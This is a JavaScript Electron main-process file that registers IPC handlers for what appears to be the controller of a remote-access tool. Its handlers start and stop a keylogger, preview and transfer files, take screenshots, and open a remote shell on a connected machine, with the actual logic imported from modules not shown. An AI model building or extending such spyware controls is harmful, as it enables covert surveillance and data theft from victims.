/**
 * Register ipc channels
 * Used for the communication between the main process and the renderer process
 * 用于主进程和渲染进程之间的通讯
 */

import { ipcMain } from 'electron'
import request from './Connect/request'
import { startServer } from './Connect/server'

const channels = {
  startServer: () => startServer(),
  requestKeylogger: (event, method) => {
    if (method === 'start') {
      // console.log("requestKeylogger")
      // event.sender.send('updateKeylogger', "2333")
      request.startKeyLogger().then((packet) => {
        event.sender.send('updateKeylogger', packet)
      }).catch(err => {
        // event.sender.send('updateKeylogger', err.toString())
        console.log('requestKeylogger' + err)
      })
    } else if (method === 'stop') {
      request.stopKeyLogger().then((packet) => {
        event.sender.send('keyloggerStop', packet)
      }).catch(err => {
        // event.sender.send('updateKeylogger', err.toString())
        console.log('stopKeylogger' + err)
      })
    } else {
      console.log('wrong method')
    }
  },
  disconnect: (event) => {
    request.disconnect().then((packet) => {
      event.sender.send('disconnected', packet)
    }).catch(err => {
      console.log(`disconnect failed ${err}`)
    })
  },
  requestFilePreview: (event) => {
    request.getFilePreview().then((packet) => {
      event.sender.send('filepreview', packet)
    }).catch(err => {
      console.log(`get filepreview failed ${err}`)
    })
  },
  requestFile: (event, path) => {
    request.transFile(path).then((packet) => {
      event.sender.send('transfile', packet)
    }).catch(err => {
      console.log(`get file failed ${err}`)
    })
  },
  requestScreenShot: (event) => {
    request.screenShot().then((packet) => {
      event.sender.send('ScreenShot', packet)
    }).catch(err => {
      console.log(`get screenShot failed ${err}`)
    })
  },
  requestShell: (event, method) => {
    if (method === 'start') {
      request.startShell().then((packet) => {
        event.sender.send('getShell', packet)
      }).catch(err => {
        console.log(`get shell failed ${err}`)
      })
    } else if (method === 'stop') {
      request.stopShell().then((packet) => {
        event.sender.send('stopShell', packet)
      }).catch(err => {
        console.log(`stop shell failed ${err}`)
      })
    } else {
      console.log('wrong method')
    }
  }
}

export function registerIpc () {
  for (let key in channels) {
    ipcMain.on(key, channels[key])
  }
}
